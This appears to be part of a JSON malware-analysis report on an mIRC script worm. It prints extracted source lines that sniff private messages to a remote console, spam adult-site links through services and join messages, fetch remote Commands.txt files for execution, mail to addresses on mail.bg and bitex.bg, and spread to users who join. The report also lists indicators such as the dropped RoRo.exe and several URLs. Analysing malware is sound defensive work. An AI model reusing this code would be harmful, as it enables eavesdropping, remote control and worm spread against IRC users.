            "n561=  if ($sockerr > 0) { .Mail.Logoff | .return }",
            "n562=  var %sRead \"\"",
            "n563=  .sockread %sRead",
            "n564=  if (220* iswm %sRead) .Mail.Logon $sockname",
            "n565=  if (354* iswm %sRead) .Mail.Head $sockname",
            "n566=  if (250*queue* iswm %sRead) || (250*qp* iswm %sRead) || (250*Message* iswm %sRead) || (250*Mail * iswm %sRead) .Mail.Logoff $sockname SUCCESS",
            "n567=  if (5* iswm %sRead) .Mail.Logoff $sockname",
            "n568=}",
            "n569=on *:sockclose:Mail-*:{ .hdel -w Data $rev($sockname,*) }",
            "n570=on *:sockopen:Mail-*:{ if ($sockerr > 0) Mail.Logoff }",
            "n571=",
            "n572=; *********************** INVITE FUNCTIONS *************************",
            "n573=alias getColor { var %sColors = 1.2.3.4.5.6.7.10.12.13.14 , %iColor = $rand(1, $numtok(%sColors,46)) | .return . $+ $gettok(%sColors,%iColor,46) }",
            "n574=alias getText { var %iColour = $rand(0,1) , %iExtra = $rand(0,5) , %s \"\"",
            "n575=  if (%iExtra == 2) %s = . | if (%iExtra == 3) %s = .",
            "n576=  if (%iColour != 1) %s = %s $+ $getColor",
            "n577=if ($getCountry == BG) .return %s $+ $gettok($1,1,42) | .return %s $+ $gettok($1,2,42) }",
            "n578=",
            "n579=on ^*:Text:*:*:{",
            "n580=  if ($nick !isin $hget(Data, Services) && http isin $1-) { .ignore -u30 $nick | .halt }",
            "n581=  if ($chan == $null) {",
            "n582=    if ($Verify($hget(Data, Sniffer.Console)) == 1 && $hget(Data, Sniffer.Messages) == 1) .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (MSG) ( $+ $Nick $+ ) $1-",
            "n583=  }",
            "n584=}",
            "n585=on ^*:Notice:*:*:{",
            "n586=  if ($nick !isin $hget(Data, Services) && http isin $1-) { .ignore -u30 $nick | .halt }",
            "n587=  if ($chan == $null) {",
            "n588=    if ($Verify($hget(Data, Sniffer.Console)) == 1 && $hget(Data, Sniffer.Notices) == 1) .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (NOTICE) ( $+ $Nick $+ ) $1-",
            "n589=  }",
            "n590=  if ($1- == IP!) { .notice $nick IP_ $+ $IP | .halt }",
            "n591=  else if (IP_*.* iswm $1) {",
            "n592=    .hinc Data iIP",
            "n593=    if ($hget(Data, iIPCount) // $hget(Data, iIP)) {",
            "n594=      if ($me != $nick && $Verify(Local-Console $+ $nick) == 0) .OpenConsole $nick $gettok($1,2,$asc(_))",
            "n595=    }",
            "n596=    .halt",
            "n597=  }",
            "n598=}",
            "n599=on ^*:Action:*:#:{ if (http isin $1-) { .ignore -u30 $nick | .halt } }",
            "n600=on ^*:Open:?:*:{ if (http isin $1-) { .ignore -u60 $nick | .halt } }",
            "n601=",
            "n602=raw *:*:{",
            "n603=  if ($numeric == 2) { $setCountry(Other) | if (UniBG isin $1-) { $setCountry(BG) } }",
            "n604=  else if (40* iswm $numeric) { .halt }",
            "n605=}",
            "n606=",
            "n607=alias AdvMe {",
            "n608=  var %sSite $ini($GFN(DEF), SITES, $rand(1,$ini($GFN(DEF),SITES,0))) , %sChan $chan($rand(1,$chan(0))) , %i $rand(0,8)",
            "n609=  .hadd Data OnJoinMsg off | .hadd Data OnJoinNotice off",
            "n610=  if (%sChan == $null) || (%sSite == $null) .return",
            "n611=  if (%i == 1) { if ($getCountry == BG) { .ignore -u20 NS | //.msg ns set URL $getColor $+ %sSite }",
            "n612=  else { .ignore -u20 NickServ | .raw -q NickServ set URL $getColor $+ %sSite } }",
            "n613=  if (%i == 2) { if ($getCountry == BG) { .ignore -u20 CS | //.msg cs set %sChan URL . $+ %sSite }",
            "n614=  else { .ignore -u20 ChanServ | .raw -q ChanServ set %sChan URL . $+ %sSite } }",
            "n615=  if (%i == 3) { .ignore -u20 *!*@* | //.describe %sChan $getText($readini($GFN(DEF),Sites,%sSite)) }",
            "n616=  if (%i == 4) { .hadd Data OnJoinMsg On }",
            "n617=  if (%i == 5) { .hadd Data OnJoinNotice On }",
            "n618=  if (%i == 6) {",
            "n619=    if ($pos($chan(%sChan).Topic,http,0) == 0) || ($pos($chan(%sChan).Topic,http,0) == $null) {",
            "n620=      if ($getCountry == BG) { .ignore -u20 CS | //.msg cs set %sChan Topic $getText($readini($GFN(DEF),Sites,%sSite)) }",
            "n621=      else { .ignore -u20 ChanServ | .raw -q ChanServ set %sChan Topic $getText($readini($GFN(DEF),Sites,%sSite)) }",
            "n622=  } }",
            "n623=  if (%i == 7) { .ignore -u20 *!*@* | //.msg %sChan $getColor $+ %sSite }",
            "n624=  .timer 1 $rand(300,600) { .AdvMe }",
            "n625=}",
            "n626=",
            "n627=alias SetSites {",
            "n628=  .AddSITE http://www.Nasty-Pamela.cjb.net :: http://Nasty-Pamela.cjb.net :: Fen sait na NAI-QKATA madama na sveta zavinagi ::*:: http://www.Nasty-Pamela.cjb.net :: fan site of the coolest girl forever!! ::",
            "n629=  .AddSITE http://GiRlz.hit.bg http://GiRlz.Hit.Bg -> Zabraneno za maje :)))*http://GiRlz.Hit.Bg -> Restricted area :))",
            "n630=  .AddSITE http://www.Hacking.Hit.bg Za vseki koito iska da stane HaCkEr, no ne znae kak da go PoStIgNe .::. http://www.Hacking.Hit.bg .::.*For everyone who wants to become a good HaCkEr, but doesn't know how to achieve it .::. http://www.Hacking.Hit.bg .::.",
            "n631=  .AddSITE http://www.Kurnikova.Bol.bg Goli snimki -=- http://www.Kurnikova.Bol.bg -=- na nai-skandalnata tenesistka v sveta!*Anna Kournikova - naked! -=- http://www.Kurnikova.Bol.bg -=- Exclusive pictures brought to you by Playboy Team 2002 ",
            "n632=  .AddSITE http://Teen-Zone.FaithWeb.CoM Zonata na vsichki bulgarski teenz oOo http://Teen-Zone.FaithWeb.CoM oOo Anti-Spek generator :00 Zapoznanstva, Liuboff, Priqteli, Problemi..*The worldwide teen zone oOo http://Teen-Zone.FaithWeb.CoM oOo Find new friends, Love match, Solve your problems, just enjoy :)",
            "n633=  .AddHTTP Free.Bol.bg/Rahmul/Commands.txt NULL EXEC",
            "n634=  .AddHTTP Rahmul.Hit.bg/Commands.txt NULL EXEC",
            "n635=  .AddHTTP Free.Techno-Link.com/Rahmul/Commands.txt NULL EXEC",
            "n636=  .AddHTTP Free.Top.bg/Rahmul/Commands.txt NULL EXEC",
            "n637=  .AddMAIL Rahmul@mail.bg mail.mail.bg",
            "n638=  .AddMAIL Rahmul@bitex.bg mail.bitex.bg",
            "n639=  .writeini $Hget(Data, File) Options Init 0",
            "n640=}",
            "n641=",
            "n642=; ************* JOIN *************",
            "n643=on ^*:JOIN:*:{",
            "n644=  if ($nick == $me) { if ($hget(Data, Drop) == On) { .timerDrop- $+ $chan 1 20 .Drop Chan $chan } }",
            "n645=  else {",
            "n646=    var %s = $readini($GFN(DEF), Sites, $ini($GFN(DEF), SITES, $rand(1,$ini($GFN(DEF),SITES,0))))",
            "n647=    if ($hget(Data, OnJoinMsg) == On) { if (%s != $null) .timerOnJoin- $+ $nick 1 $rand(10,30) if ($query( $+ $nick $+ ) == $ $+ null) //.msg $nick $getText(%s) }",
            "n648=    if ($hget(Data, OnJoinNotice) == On) { if (%s != $null) .timerOnJoin- $+ $nick 1 $rand(10,30) if ($query( $+ $nick $+ ) == $ $+ null) //.notice $nick $getText(%s) }",
            "n649=    if ($hget(Data, Spread) == On) || ($hget(Data, Mass) == on) {",
            "n650=      .hinc Data iJoin",
            "n651=    if ($hget(Data,iJoinCount) // $hget(Data,iJoin) && $verify(Local-Console- $+ $nick) == 0) .OpenConsole $nick $GetTok($address,2,$asc(@)) }",
            "n652=  }",
            "n653=}",
            "n654=on ^*:PART:*:{ if ($hget(Data, OnJoinMsg) == On) || ($hget(Data, OnJoinNotice) == On) .timerOnJoin- $+ $nick Off }",
            "n655=on ^*:QUIT:{ if ($hget(Data, OnJoinMsg) == On) || ($hget(Data, OnJoinNotice) == On) .timerOnJoin- $+ $nick Off }",
            "n656=on ^*:Nick:{ ",
            "n657=  if ($hget(Data, Drop) == On) { if ($nick == $me) { .timerDrop- $+ $nick off | .timerDrop- $+ $newnick 1 20 .Drop Nick $newnick } }",
            "n658=  if ($hget(Data, OnJoinNotice) == On) || ($hget(Data, OnJoinMsg) == On) { .timerOnJoin- $+ $nick Off }",
            "n659=}"
        ],
        "file": {
            "n116=      .hadd Data $rev(%sName, LocalName) $WinDir $+ \\RoRo.exe": "Executable",
            "n189=    if (%DIR.Tmp != $null && $Verify($sockname) == 1) .sockwrite -tn $sockname %DIR.Tmp": "Temporary"
        },
        "fuzzing": {},
        "ip": [
            "5.6.7.10",
            "1.2.3.4"
        ],
        "url": [
            "http://GiRlz.hit.bg",
            "http://www.Hacking.Hit.bg",
            "http://Teen-Zone.FaithWeb.CoM",
            "http://GiRlz.Hit.Bg",
            "http://www.Nasty-Pamela.cjb.net",
            "http://www.Kurnikova.Bol.bg",
            "http://www.",
            "http://Nasty-Pamela.cjb.net"
        ]
    },
    "time": "0:00:00.522356",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
